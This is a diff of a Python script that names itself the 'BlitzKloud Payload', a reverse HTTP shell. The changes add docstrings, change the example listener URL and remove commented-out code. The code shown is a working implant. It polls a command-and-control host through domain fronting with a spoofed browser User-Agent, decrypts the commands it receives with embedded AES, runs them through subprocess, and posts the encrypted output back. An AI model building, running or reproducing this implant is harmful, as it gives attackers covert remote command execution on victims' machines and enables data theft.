@@ -1,15 +1,13 @@
 #!/usr/bin/env  python3
-# BlitzKloud ~ Reverse HTTP Shell w/ Cloudflare SNI & AES Support
-# https://github.com/darkerego/blitzkloud
-# Darkerego, 2019 ~ xelectron@protonmail.com
-
+# BlitzKloud Payload - https://github.com/darkerego/blitzkloud
+# darkerego, 2019 ~ xelectron@protonmail.com
 import base64
+import re
 import shlex
 from time import sleep
 from subprocess import PIPE, Popen
 import requests
 from random import randint
-import re
 
 """
 PyAES Embedded Library -- Allows for cross platform compatibility with no outside dependencies.
@@ -1180,15 +1178,22 @@ Main Program Logic Starts here
 #  Configuration
 debug = False
 front_url = 'your.remote.host'  # your c&c server: example: developer.attacker.com
-url = 'http://mediafire.com:8880'  # example: http://upwork.com:8880 - (include port of listener if not port 80 (http)
+url = 'http://localhost:8880'  # example: http://upwork.com:8880 - (include port of listener if not port 80 (http)
 host_header = str('Host: %s' % front_url)
 key = b"This_key_for_demo_purposes_only!"  # AES Encryption key - keep private, must be in byte form.
+
 
 # runtime variables
 
 connected = False
 
+
 def enc(data):
+    """
+    Encryption function (using ported pyaes)
+    :param data: plaintext
+    :return: ciphertext (base64 wrapper)
+    """
     # A 256 bit (32 byte) key
     plaintext = "Text may be any length you wish, no padding is required"
     # key must be bytes, so we convert it
@@ -1201,6 +1206,11 @@ def enc(data):
 
 
 def denc(data):
+    """
+    Decryption function (via ported pyaes)
+    :param data: ciphertext (base64 wrapper)
+    :return: plaintext
+    """
     # DECRYPTION
     # CRT mode decryption requires a new instance be created
     aes = AESModeOfOperationCTR(key)
@@ -1230,6 +1240,14 @@ def denc(data):
 
 
 def req(url, payload=None, method='POST', timeout=600):
+    """
+    HTTP Request Function
+    :param url: query this DNS
+    :param payload: if method is post, send this payload
+    :param method: HTTP method, supported: GET, POST
+    :param timeout: Timeout of request
+    :return: upon failure
+    """
     headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
                'Accept': 'text/css,*/*;q=0.1',
                'Accept-Language': 'en-US,en;q=0.5',
@@ -1269,6 +1287,9 @@ def req(url, payload=None, method='POST', timeout=600):
 
 
 class Result:
+    """
+    Empty object to store result of commands
+    """
     def __init__(self, status_code=None, stdout=None, stderr=None, command=None):
         self.status_code = status_code
         self.stdout = stdout
@@ -1280,6 +1301,11 @@ class Result:
 
 
 def execmd(command):
+    """
+    Function to execute incoming commands
+    :param command: execute via subpipe
+    :return: standard output of command
+    """
     result = Result()
 
     p = Popen(shlex.split(command), stdin=PIPE, stdout=PIPE, stderr=PIPE)
@@ -1301,10 +1327,12 @@ def execmd(command):
 
 
 def shell():
+    """
+    Reverse HTTP Shell Logic
+    :return: --
+    """
     while True:
         url_ = url
-        # async with aiohttp.ClientSession() as session:
-        # html = await http(session, url_, payload=None, method="POST")
         try:
             html = req(url=url_, payload=None, timeout=600, method='GET')
         except Exception as err:
@@ -1314,14 +1342,6 @@ def shell():
         else:
             if debug:
                 print(html)
-            """try:
-                html = html.strip('<html><body><h1>')
-            except Exception:
-                return
-            try:
-                html = html.strip('</h1></body></html>')
-            except Exception:
-                return"""
             try:
                 html = re.sub('<[^<>]+>', '', html)
             except Exception as err:
@@ -1382,12 +1402,13 @@ def shell():
                                 req(url, payload=ret, method='POST', timeout=10)
                                 # sleep(1)
                                 return
-                            # async shell:
-                            # await parse_url(session, url, ret, headers, 10)
-                            # output = await http(session, url_, payload=ret, method="POST")
 
 
 def main():
+    """
+    Program Start
+    :return: --
+    """
     while True:
         try:
             shell()
